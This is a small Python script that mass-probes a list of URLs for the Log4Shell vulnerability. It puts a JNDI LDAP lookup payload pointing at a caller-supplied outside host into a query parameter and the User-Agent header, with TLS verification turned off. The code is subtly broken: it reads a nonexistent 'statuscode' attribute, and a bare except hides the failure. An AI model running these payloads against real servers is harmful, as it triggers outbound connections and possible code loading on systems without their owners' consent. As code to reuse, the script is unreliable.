from sys import argv
import requests
from time import sleep
import urllib3

urllib3.disable_warnings()

if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urls = urlFile.readlines()
    for url in urls:
        try:
            params = {'test': '${jndi:ldap://'+argv[2]+'/a}'}
            headers = {'User-Agent': '${jndi:ldap://'+argv[2]+'/a}'}
            url = url.strip()
            print('[!] Testing {}'.format(url))
            r = requests.get(url, headers=headers, params=params, verify=False, timeout=10)
            print('[!] Status code {}'.format(r.statuscode))
        except:
            pass
        sleep(0.3)
else:
    print('[!] Syntax: python3 {} <urlList> <collab>'.format(argv[0]))
